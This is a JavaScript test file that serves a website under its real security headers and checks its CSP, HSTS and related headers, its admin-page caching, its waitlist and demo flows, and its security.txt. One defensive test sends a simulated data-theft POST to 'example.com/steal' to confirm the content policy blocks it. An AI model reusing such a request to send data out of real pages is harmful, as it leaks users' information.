// The website under its real security headers. The other suites load pages
// from disk, where no header applies — so a header that broke a page would
// ship unnoticed. This one builds nothing: it serves site/ (the built site)
// over http with exactly what site/_headers says, the way Netlify or
// Cloudflare Pages would, and then uses the pages.
const fs = require('fs');
const path = require('path');
const http = require('http');
const { launch, step, finish, REPO } = require('./lib/harness');

const SITE = path.join(REPO, 'site');
const MIME = { '.html': 'text/html; charset=utf-8', '.png': 'image/png', '.txt': 'text/plain; charset=utf-8' };

// "/path" or "/path/*" followed by indented "Name: value" lines.
function parseHeaders(text) {
  const rules = [];
  let cur = null;
  for (const raw of text.split('\n')) {
    if (!raw.trim() || raw.trim().startsWith('#')) continue;
    if (!/^\s/.test(raw)) { cur = { pattern: raw.trim(), headers: {} }; rules.push(cur); continue; }
    const i = raw.indexOf(':');
    cur.headers[raw.slice(0, i).trim().toLowerCase()] = raw.slice(i + 1).trim();
  }
  return rules;
}
const matches = (pattern, url) => (pattern.endsWith('*') ? url.startsWith(pattern.slice(0, -1)) : url === pattern);

(async () => {
  const rules = parseHeaders(fs.readFileSync(path.join(SITE, '_headers'), 'utf8'));
  const server = http.createServer((req, res) => {
    const url = decodeURIComponent(req.url.split('?')[0]);
    let file = path.join(SITE, url);
    if (fs.existsSync(file) && fs.statSync(file).isDirectory()) file = path.join(file, 'index.html');
    if (!file.startsWith(SITE) || !fs.existsSync(file)) { res.writeHead(404); res.end('not found'); return; }
    const headers = { 'content-type': MIME[path.extname(file)] || 'application/octet-stream' };
    for (const r of rules) if (matches(r.pattern, url)) Object.assign(headers, r.headers);
    res.writeHead(200, headers);
    fs.createReadStream(file).pipe(res);
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const origin = `http://127.0.0.1:${server.address().port}`;
  const browser = await launch();

  // A page plus everything the browser refused on it.
  const open = async (url) => {
    const page = await browser.newPage();
    const refused = [];
    page.on('console', (m) => { if (/Content Security Policy|Refused to|Permissions policy/i.test(m.text())) refused.push(m.text().slice(0, 160)); });
    page.on('pageerror', (e) => refused.push('page error: ' + e.message));
    await page.addInitScript(() => {
      window.__violations = [];
      document.addEventListener('securitypolicyviolation', (e) => window.__violations.push(`${e.violatedDirective} ${e.blockedURI}`));
    });
    const response = await page.goto(origin + url);
    const all = async () => refused.concat(await page.evaluate(() => window.__violations));
    return { page, response, all };
  };

  await step('every page is served with the full set of security headers', async () => {
    for (const url of ['/', '/demo/', '/privacy/', '/terms/', '/safety/', '/delete-account/', '/admin/']) {
      const { page, response } = await open(url);
      const h = response.headers();
      const need = {
        'strict-transport-security': /max-age=31536000; includeSubDomains/,
        'x-content-type-options': /^nosniff$/,
        'x-frame-options': /^DENY$/,
        'referrer-policy': /^strict-origin-when-cross-origin$/,
        'content-security-policy': /default-src 'self'.*connect-src 'self' https:\/\/\*\.supabase\.co.*frame-ancestors 'none'/,
        'permissions-policy': /camera=\(\), microphone=\(\), geolocation=\(\), payment=\(\)/,
      };
      for (const [name, re] of Object.entries(need)) {
        if (!re.test(h[name] || '')) throw new Error(`${url} is missing ${name}: ${h[name]}`);
      }
      await page.close();
    }
  });

  await step('the content policy never allows eval, any script host, or framing', async () => {
    const csp = rules.find((r) => r.pattern === '/*').headers['content-security-policy'];
    if (/unsafe-eval/.test(csp)) throw new Error('unsafe-eval is allowed');
    const script = /script-src ([^;]+)/.exec(csp)[1].trim();
    if (script !== "'self' 'unsafe-inline'") throw new Error('script-src allows more than this site: ' + script);
    if (!/object-src 'none'/.test(csp) || !/base-uri 'self'/.test(csp) || !/form-action 'self'/.test(csp)) throw new Error('object-src / base-uri / form-action not locked');
  });

  await step('the moderation desk is not indexed and not cached', async () => {
    const { page, response } = await open('/admin/');
    const h = response.headers();
    if (!/noindex/.test(h['x-robots-tag'] || '') || h['cache-control'] !== 'no-store') throw new Error(JSON.stringify([h['x-robots-tag'], h['cache-control']]));
    const landing = await open('/');
    if (landing.response.headers()['x-robots-tag']) throw new Error('the public pages are marked noindex');
    await landing.page.close();
    await page.close();
  });

  await step('the landing page works under the headers: the waitlist form submits', async () => {
    const { page, all } = await open('/');
    await page.evaluate(() => { window.RSVPLAY = { SUPABASE_URL: '', SUPABASE_ANON_KEY: '' }; });
    await page.fill('#hero-email', 'headers@example.com');
    await page.click('#hero-form button');
    await page.waitForSelector('#hero-success', { state: 'visible', timeout: 3000 });
    const refused = await all();
    if (refused.length) throw new Error('refused: ' + refused.join(' | '));
    await page.close();
  });

  await step('the live waitlist call to Supabase is allowed by the policy', async () => {
    const { page, all } = await open('/');
    let called = null;
    await page.route('https://abcdefghijklmnop.supabase.co/**', (route) => {
      called = route.request().url();
      route.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: 'null' });
    });
    await page.evaluate(() => { window.RSVPLAY = { SUPABASE_URL: 'https://abcdefghijklmnop.supabase.co', SUPABASE_ANON_KEY: 'anon' }; });
    await page.fill('#hero-email', 'live@example.com');
    await page.click('#hero-form button');
    await page.waitForFunction(() => document.querySelector('#hero-success') && getComputedStyle(document.querySelector('#hero-success')).display !== 'none', null, { timeout: 3000 }).catch(() => {});
    const refused = await all();
    if (refused.length) throw new Error('refused: ' + refused.join(' | '));
    if (!called || !/supabase\.co\/rest\/v1\/rpc\/join_waitlist/.test(called)) throw new Error('the call never left the page: ' + called);
    await page.close();
  });

  await step('a call to any other host is refused', async () => {
    const { page, all } = await open('/');
    const blocked = await page.evaluate(() => fetch('https://example.com/steal', { method: 'POST', body: 'x' }).then(() => 'sent', () => 'refused'));
    if (blocked !== 'refused') throw new Error('a request to another host went out');
    if (!(await all()).some((v) => /connect-src/.test(v))) throw new Error('no connect-src violation was recorded');
    await page.close();
  });

  await step('the demo works under the headers: sign up and reach Home', async () => {
    const { page, all } = await open('/demo/');
    await page.click('#btn-create');
    await page.fill('#ob-name', 'Jordan'); await page.fill('#ob-age', '32');
    await page.click('#ob-gender [data-gender="woman"]');
    await page.click('#ob1-next');
    await page.fill('#ob-phone', '3175550142'); await page.click('#phone-send');
    await page.fill('#ob-phone-code', '123456'); await page.click('#phone-verify'); await page.click('#obphone-next');
    await page.click('[data-sport="Pickleball"]'); await page.click('#ob2-next');
    await page.click('[data-skill="Intermediate"]'); await page.click('#ob3-next');
    await page.click('#ob4-done');
    await page.waitForSelector('#screen-home.active', { timeout: 3000 });
    const refused = await all();
    if (refused.length) throw new Error('refused: ' + refused.join(' | '));
    await page.close();
  });

  await step('the policies and the desk load with nothing refused', async () => {
    for (const url of ['/privacy/', '/terms/', '/safety/', '/delete-account/', '/admin/']) {
      const { page, all } = await open(url);
      await page.waitForTimeout(300);
      const refused = await all();
      if (refused.length) throw new Error(`${url} refused: ${refused.join(' | ')}`);
      await page.close();
    }
  });

  await step('security.txt is where researchers look, and has not expired', async () => {
    const { page, response } = await open('/.well-known/security.txt');
    const text = await response.text();
    if (!/^Contact: mailto:security@rsvplayapp\.com$/m.test(text)) throw new Error('no security contact');
    const exp = /^Expires: (.+)$/m.exec(text);
    if (!exp || Number.isNaN(Date.parse(exp[1]))) throw new Error('no Expires date');
    const days = (Date.parse(exp[1]) - Date.now()) / 86400000;
    if (days < 30) throw new Error(`security.txt expires in ${Math.round(days)} days: set a new date in landing/security.txt`);
    if (days > 366) throw new Error('Expires is more than a year away; RFC 9116 says under a year');
    await page.close();
  });

  await browser.close();
  server.close();
  finish();
})();
